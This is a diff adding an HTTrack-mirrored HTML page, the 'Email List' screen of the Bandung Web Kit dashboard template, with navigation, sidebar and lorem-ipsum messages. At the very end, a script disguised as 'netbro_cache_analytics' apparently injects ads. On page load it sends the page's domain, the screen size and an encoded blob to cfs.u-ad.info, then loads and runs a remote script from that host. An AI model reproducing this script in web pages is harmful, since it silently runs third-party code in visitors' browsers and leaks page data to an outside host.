@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en" class="">
+
+<!-- Mirrored from bdgwebkit.com/dashboard-components/email-list.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Apr 2016 08:48:10 GMT -->
+<head>
+  <meta charset="utf-8" />
+  <title>Bandung Web Kit | BDGWEBKIT</title>
+  <meta name="description" content="Bandung Web Kit" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <link rel="stylesheet" href="../libs_dashboard/assets/animate.css/animate.css" type="text/css" />
+  <link rel="stylesheet" href="../libs_dashboard/assets/font-awesome/css/font-awesome.min.css" type="text/css" />
+  <link rel="stylesheet" href="../libs_dashboard/assets/simple-line-icons/css/simple-line-icons.html" type="text/css" />
+  <link rel="stylesheet" href="../libs_dashboard/jquery/bootstrap/dist/css/bootstrap.css" type="text/css" />
+
+  <link rel="stylesheet" href="css/font.css" type="text/css" />
+  <link rel="stylesheet" href="css/style.css" type="text/css" />
+  
+
+</head>
+<body>
+<div class="app app-header-fixed ">
+  
+
+    <!-- header -->
+  <header id="header" class="app-header navbar" role="menu">
+      <!-- navbar header -->
+      <div class="navbar-header bg-info">
+        <button class="pull-right visible-xs dk" ui-toggle-class="show" target=".navbar-collapse">
+          <i class="glyphicon glyphicon-cog"></i>
+        </button>
+        <button class="pull-right visible-xs" ui-toggle-class="off-screen" target=".app-aside" ui-scroll="app">
+          <i class="glyphicon glyphicon-align-justify"></i>
+        </button>
+        <!-- brand -->
+        <a href="#/" class="navbar-brand text-lt">          
+          <img src="img/logo-small.png" alt="." class="small-logo hide">
+          <img src="img/logo.png" alt="." class="large-logo">
+        </a>
+        <!-- / brand -->
+      </div>
+      <!-- / navbar header -->
+
+      <!-- navbar collapse -->
+      <div class="collapse pos-rlt navbar-collapse bg-info">
+        <!-- buttons -->
+        <div class="nav navbar-nav hidden-xs">
+                  
+        </div>
+        <!-- / buttons -->
+
+        <!-- link and dropdown -->
+        <ul class="nav navbar-nav hidden-sm">
+          <li>
+            <a href="#">HOME</a>
+          </li>
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
+              <i class="fa fa-fw fa-plus visible-xs-inline-block"></i>
+              <span>PAGES</span> <span class="caret"></span>
+            </a>
+            <ul class="dropdown-menu" role="menu">
+              
+              <li>
+                <a href="#">
+                  <span class="badge bg-danger pull-right">5</span>
+                  <span>Form Elements</span>
+                </a>
+              </li>
+
+              <li>
+                <a href="#">
+                  <span class="badge bg-info pull-right">15</span>
+                  <span>Form Validation</span>
+                </a>
+              </li>
+
+              <li>
+                <a href="#">
+                  <span>Form Wizard</span>
+                </a>
+              </li>
+              
+            </ul>
+          </li>
+           <li>
+            <a href="#">PROJECT</a>
+          </li>
+        </ul>
+        <!-- / link and dropdown -->
+
+        <!-- nabar right -->
+        <ul class="nav navbar-nav navbar-right">
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
+              <i class="icon-bdg_alert text14"></i>
+              <span class="visible-xs-inline">Notifikasi</span>
+              <span class="badge badge-sm up bg-danger pull-right-xs">2</span>
+            </a>
+            <!-- dropdown -->
+            <div class="dropdown-menu w-xl animated fadeIn">
+              <div class="panel bg-white">
+                <div class="panel-heading b-light bg-light">
+                  <strong>Kamu Punya <span>2</span> Notifikasi</strong>
+                </div>
+                <div class="list-group">
+                  <a href class="list-group-item">
+                    <span class="pull-left m-r thumb-sm">
+                      <img src="img/01.jpg" alt="..." class="img-circle">
+                    </span>
+                    <span class="clear block m-b-none">
+                      Pembangunan Taman daerah Bandung Barat<br>
+                      <small class="text-muted">10 minutes ago</small>
+                    </span>
+                  </a>
+                  <a href class="list-group-item">
+                    <span class="clear block m-b-none">
+                      Revitalisasi Sungai Cikapundung<br>
+                      <small class="text-muted">1 hour ago</small>
+                    </span>
+                  </a>
+                </div>
+                <div class="panel-footer text-sm">
+                  <a href class="pull-right"><i class="icon-bdg_setting3"></i></a>
+                  <a href="#notes" data-toggle="class:show animated fadeInRight">Lihat Semua Notifikasi</a>
+                </div>
+              </div>
+            </div>
+            <!-- / dropdown -->
+          </li>
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
+              <i class="icon-bdg_search text14"></i>              
+            </a>
+            <!-- dropdown -->
+             <div class="search_wrapper pull-right w-xl animated fadeIn">
+              <form action="#">
+                <i class="pull-left glyphicon glyphicon-search"></i>
+                  <input type="text" class="pull-left" placeholder="Type Here">
+                <a href="#" class="remove-search"><i class="pull-right icon-bdg_cross"></i></a>
+              </form>
+            </div>
+            <!-- / dropdown -->
+          </li>
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="bg-blue profile-header dropdown-toggle clear" data-toggle="dropdown">
+              <span class="thumb-sm avatar pull-left m-t-n-sm m-b-n-sm m-r-sm">
+                <img src="img/01.jpg" alt="...">                
+              </span>
+              <span class="hidden-sm hidden-md m-r-xl">Ridwan Kamil</span> <i class="text14 icon-bdg_setting3 pull-right"></i>
+            </a>
+            <!-- dropdown -->
+            <ul class="dropdown-menu animated fadeIn w-ml">             
+              <li>
+                <a href>
+                  <span class="badge bg-danger pull-right">30%</span>
+                  <span>Settings</span>
+                </a>
+              </li>
+              <li>
+                <a href>Profile</a>
+              </li>
+              <li>
+                <a href>
+                  <span class="label bg-info pull-right">new</span>
+                  Help
+                </a>
+              </li>
+              <li class="divider"></li>
+              <li>
+                <a>Logout</a>
+              </li>
+            </ul>
+            <!-- / dropdown -->
+          </li>
+        </ul>
+        <!-- / navbar right -->
+      </div>
+      <!-- / navbar collapse -->
+  </header>
+  <!-- / header -->
+
+
+    <!-- aside -->
+  <aside id="aside" class="app-aside hidden-xs bg-dark">
+      <div class="aside-wrap">
+        <div class="navi-wrap">
+          <!-- user -->
+          <div class="clearfix hidden-xs text-center hide" id="aside-user">
+            <div class="dropdown wrapper">
+              <a href="app.page.html">
+                <span class="thumb-lg w-auto-folded avatar m-t-sm">
+                  <img src="img/01.jpg" class="img-full" alt="...">
+                </span>
+              </a>
+              <a href="#" data-toggle="dropdown" class="dropdown-toggle hidden-folded">
+                <span class="clear">
+                  <span class="block m-t-sm">
+                    <strong class="font-bold text-lt">John.Smith</strong> 
+                    <b class="caret"></b>
+                  </span>
+                  <span class="text-muted text-xs block">Art Director</span>
+                </span>
+              </a>
+              <!-- dropdown -->
+              <ul class="dropdown-menu animated fadeInRight w hidden-folded">
+                <li class="wrapper b-b m-b-sm bg-info m-t-n-xs">
+                  <span class="arrow top hidden-folded arrow-info"></span>
+                  <div>
+                    <p>300mb of 500mb used</p>
+                  </div>
+                  <div class="progress progress-xs m-b-none dker">
+                    <div class="progress-bar bg-white" data-toggle="tooltip" data-original-title="50%" style="width: 50%"></div>
+                  </div>
+                </li>
+                <li>
+                  <a href>Settings</a>
+                </li>
+                <li>
+                  <a href="page_profile.html">Profile</a>
+                </li>
+                <li>
+                  <a href>
+                    <span class="badge bg-danger pull-right">3</span>
+                    Notifications
+                  </a>
+                </li>
+                <li class="divider"></li>
+                <li>
+                  <a href="page_signin.html">Logout</a>
+                </li>
+              </ul>
+              <!-- / dropdown -->
+            </div>
+            <div class="line dk hidden-folded"></div>
+          </div>
+          <!-- / user -->
+
+         <!-- nav -->
+          <nav ui-nav class="navi clearfix">
+            <ul class="nav">
+              <li class="hidden-folded m-t text-dark-grey text-xs padder-md padder-v-sm">
+                <span>Navigation</span>
+              </li>
+              <li>
+                <a href="index-2.html" class="text-dark-grey" >      
+                  <i class="icon-bdg_dashboard icon-grey"></i>
+                  <span class="font-bold">Dashboard</span>
+                </a>               
+              </li>
+              
+              <li class="line1 dg"></li>
+
+              <li class="hidden-folded text-dark-grey text-xs padder-md padder-v-sm">
+                <span>Components</span>
+              </li>
+               
+              <li>
+                <a href class="auto">
+                  <span class="pull-right text-muted">
+                    <i class="text8 icon-bdg_arrow3 text"></i>
+                    <i class="text8 icon-bdg_arrow1 text-active"></i>
+                  </span>
+                  <i class="icon-bdg_uikit"></i>
+                  <span class="font-bold">UI Kits</span>
+                </a>
+                <ul class="nav nav-sub dk">
+                  <li class="nav-sub-header">
+                    <a href>
+                      <span>UI Kits</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="ui_button.html">
+                      <span>Buttons</span>
+                    </a>
+                  </li>
+                  <li >
+                    <a href="ui_icons.html">
+                      <b class="badge bg-danger pull-right">3</b>
+                      <span>Icons</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="ui_grid.html">
+                      <span>Grid</span>
+                    </a>
+                  </li>
+                  
+                 
+                </ul>
+              </li>
+              <li>
+                <a href="table_static.html" class="auto">
+                  
+                  <b class="badge bg-info pull-right">2</b>
+                  <i class="icon-bdg_table"></i>
+                  <span class="font-bold">Table</span>
+                </a>
+               
+              </li>
+              <li>
+                  <a href="form_element.html" class="auto">                  
+                  <i class="icon-bdg_form"></i>
+                  <span class="font-bold">Form</span>
+                </a>                
+              </li>
+              <li>
+                <a href="ui_chart.html">
+                  <i class="icon-bdg_chart2"></i>
+                  <span class="font-bold">Chart</span>
+                </a>
+              </li>
+              <li class="active">
+                <a href class="auto">
+                  <span class="pull-right text-muted">
+                    <i class="text8 icon-bdg_arrow3 text"></i>
+                    <i class="text8 icon-bdg_arrow1 text-active"></i>
+                  </span>
+                  <i class="icon-bdg_layout"></i>
+                  <span class="font-bold">Pages</span>
+                </a>
+                <ul class="nav nav-sub dk">
+                  <li class="nav-sub-header">
+                    <a href>
+                      <span>Pages</span>
+                    </a>
+                  </li>
+    
+                  <li>
+                    <a href="email.html">
+                      <span>Email</span>
+                    </a>
+                  </li>
+
+                   <li class="active">
+                    <a href="email-list.html">
+                      <span>Email List</span>
+                    </a>
+                  </li>
+
+                   <li>
+                    <a href="note.html">
+                      <span>Note</span>
+                    </a>
+                  </li>
+
+                   <li>
+                    <a href="profile.html">
+                      <span>Profile</span>
+                    </a>
+                  </li>
+
+                   <li>
+                    <a href="contact.html">
+                      <span>Contact</span>
+                    </a>
+                  </li>
+
+                   <li>
+                    <a href="contact-list.html">
+                      <span>Contact List</span>
+                    </a>
+                  </li>
+
+                  <li>
+                    <a href="lockscreen.html">
+                      <span>Lock screen</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="signin.html">
+                      <span>Signin</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="register.html">
+                      <span>Signup</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="forgot_password.html">
+                      <span>Forgot password</span>
+                    </a>
+                  </li>
+                 
+                </ul>
+              </li>
+             
+              
+            </ul>
+          </nav>
+          <!-- nav -->
+
+
+
+        </div>
+      </div>
+  </aside>
+  <!-- / aside -->
+<!-- content -->
+<div id="content" class="app-content" role="main">
+
+  <div class="hbox hbox-auto-xs hbox-auto-sm ng-scope">
+    <div class="col">
+      <div class="app-content-body app-content-full fade-in-up ng-scope h-full ">
+
+          <div class="bg-light lter">    
+              <ul class="breadcrumb bg-grey-breadcrumb m-b-none">
+                <li><a href="#" class="btn no-shadow" ui-toggle-class="app-aside-folded" target=".app">
+                  <i class="icon-bdg_expand1 text"></i>
+                  <i class="icon-bdg_expand2 text-active"></i>
+                </a>   </li>
+                <li><a href>Home</a></li>               
+                <li><i class="fa fa-angle-right"></i><a href="#">Pages</a></li>
+                <li class="active"><i class="fa fa-angle-right"></i>Email</li>
+              </ul>
+          </div>          
+          
+          <!-- column -->
+
+          <!-- hbox layout -->
+<div class="hbox hbox-auto-xs hbox-auto-sm bg-light ">
+
+  <!-- column -->
+  <div class="col w-md b-r">
+    <div class="vbox bg-white">
+      <div class="row-row">
+        <div class="cell scrollable hover">
+          <div class="cell-inner b-b">
+            <div class="list-group no-radius no-border m-b-none">
+              <h4 class="b-b padder-sm m-t-none b-b text18 font-bold padder-v">Email <a class="btn btn-danger btn-sm pull-right m-t-n-xs">Compose</a></h4>
+              <a class="list-group-item padder-sm text14" >Inbox</a>
+              <a class="list-group-item hover-anchor b-a no-select padder-sm" >
+                <span class="pull-right text-muted m-t-n-md hover-action padder-sm"></span>
+                <span class="block text14" >Starred</span>               
+              </a>
+
+               <a class="list-group-item hover-anchor text13 b-a no-select padder-sm" >
+                <span class="pull-right text-muted m-t-n-md hover-action padder-v"></span>
+                <span class="block text14" >Important</span>               
+              </a>
+
+               <a class="list-group-item hover-anchor text13 b-a no-select padder-sm" >
+                <span class="pull-right text-muted m-t-n-md hover-action padder-sm"></span>
+                <span class="block text14" >Draft</span>               
+              </a>
+
+               <a class="list-group-item hover-anchor text13 b-a no-select padder-sm" >
+                <span class="pull-right text-muted m-t-n-md hover-action padder-sm"></span>
+                <span class="block text14" >Trash</span>               
+              </a>
+
+               <a class="list-group-item hover-anchor text13 b-a no-select padder-sm" >
+                <span class="pull-right text-muted m-t-n-md hover-action padder-sm"></span>
+                <span class="block text14" >Labels</span>               
+              </a>
+              
+              <ul class="m-t-lg">
+                <li class="list-status m-b-md text12">
+                  <i class="busy b-none left m-l-n-md"></i>
+                  Work
+                </li>
+                <li class="list-status m-b-md text12">
+                  <i class="on left m-l-n-md"></i>
+                  Work
+                </li>
+                <li class="list-status m-b-md text12">
+                  <i class="away b-white left m-l-n-md"></i>
+                  Work
+                </li>
+              </ul>
+                
+                <div class="form-group wrapper-md">
+                  <div class="input-group">
+                    <input type="text" class="input-sm form-control" placeholder="New Label">
+                    <span class="input-group-btn">
+                      <button class="btn btn-cancel btn-sm" type="button">Add</button>
+                    </span>
+                  </div>
+                </div>
+
+            </div>
+          </div>
+        </div>
+      </div>
+     
+    </div>
+  </div>
+  <!-- /column -->
+
+  <!-- column -->
+  <div class="col w-full b-r">
+    <div class="vbox ">
+          
+          <div class="b-b m-t-n-xxs padder-b-md">
+            <div class="input-group m-l-lg">
+              <button class="btn btn-sm m-r-sm btn-default">Save Draft</button>
+              <button class="btn btn-sm m-r-sm btn-cancel">Delete</button>    
+            </div>
+          </div>
+
+         <div class="row">
+              <div class="col-sm-12">
+                <div class="list-group">
+                  
+                  <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-info b-l-4x r-none b-t-b-none">
+                    <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                    <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                    <p class="inline m-l-md">Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                    <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                  </div>
+
+                  <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-success b-l-4x r-none b-t-b-none">
+                    <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                    <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                    <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                    <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                  </div>
+
+                   <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-danger b-l-4x r-none b-t-b-none">
+                    <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                    <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                    <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                    <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                   </div>
+
+                    <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-warning b-l-4x r-none b-t-b-none">
+                      <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                      <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                      <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                      <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                    </div>
+
+                    <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-success b-l-4x r-none b-t-b-none">
+                      <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                      <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                      <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                      <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                    </div>
+
+                    <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-success b-l-4x r-none b-t-b-none">
+                      <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                      <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                      <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                      <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                    </div>
+
+                    <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-success b-l-4x r-none b-t-b-none">
+                      <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                      <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                      <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                      <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                    </div>
+
+                    <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-warning b-l-4x r-none b-t-b-none">
+                      <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                      <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                      <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                      <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                    </div>
+                     <div class="list-group-item wrapper-md b-b padder-v no-bg b-l-danger b-l-4x r-none b-t-b-none">
+                      <img src="img/ridwan_kamil_head.jpg" class="inline b m-l-sm b-4x b-white avatar thumb-sm" alt="">
+                      <h4 class="inline m-l-md text14 font-semibold">Fajar Sidik</h4>
+                      <p class="inline m-l-md"><i class="fa fa-paperclip text16 m-r-sm"></i>Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, lorem quis bibendum</p>
+                      <p class="inline m-l-sm pull-right text-light-grey m-t-sm">23:04</p>
+                    </div>
+
+                </div>
+                
+              </div>    
+         </div>
+
+    </div>
+  </div>
+  <!-- /column -->
+
+  
+</div>
+<!-- /hbox layout -->
+  <div class="col-md-12 padder-v"></div>
+  </div>
+  <!-- App Content body -->
+
+  </div>
+  <!-- col -->
+</div>
+<!-- Hbox -->
+
+
+
+</div>
+
+<script src="../libs_dashboard/jquery/jquery/dist/jquery.js"></script>
+<script src="../libs_dashboard/jquery/bootstrap/dist/js/bootstrap.js"></script>
+<script src="js/ui-load.js"></script>
+<script src="js/ui-jp.config.js"></script>
+<script src="js/ui-jp.js"></script>
+<script src="js/ui-nav.js"></script>
+<script src="js/ui-toggle.js"></script>
+<script src="js/ui-client.js"></script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnZJcdmojQFr1V0qhzt8DOUwoCkBEKal2gmItYDoEEZqjk5qiOv7usqbGe2bP9eyYHSi%2bWQmf7iJ22Fao0e3ySUSRD04hyy9rHM7pwqaitb%2byUGTNTa3tLDgo46LNHrZvEMR0I77DG%2fd%2fWfFd%2bVe5h6rBA%2bPK3Ts%2fctuFq5au48GLMTWuI0zRfmlXFqybRIC9N3JU9B%2bQ%2b0GlrCjnj5UuJNF1KFiVm5sIgZNjNcT6mrrc9dZY4c6Os3thDRdyXIk%2bW6tNVB%2bILGx8f7tYV0SAKr5d3AAZckAi%2bW2l5TOjTizzm%2fly5t7pM2mNkMvZojVExgzqN21WYDpXg9UG%2f2nruEnsRhhNYKxB%2bDIVx20RFKWCyvW78y6nbGUhQ8MOAT6uYpE9%2fjafJnZahtuNNXkcoG%2fp4tT3HJdtJcK0ilGZLYgeGl4GdHNh18NQgiJ1mANzVcYe9zTGSja0EVIBUP5kB3Q2%2blU9uTgSDG6MYntUzGR5MrbkrZhYZTA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from bdgwebkit.com/dashboard-components/email-list.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Apr 2016 08:48:10 GMT -->
+</html>
+
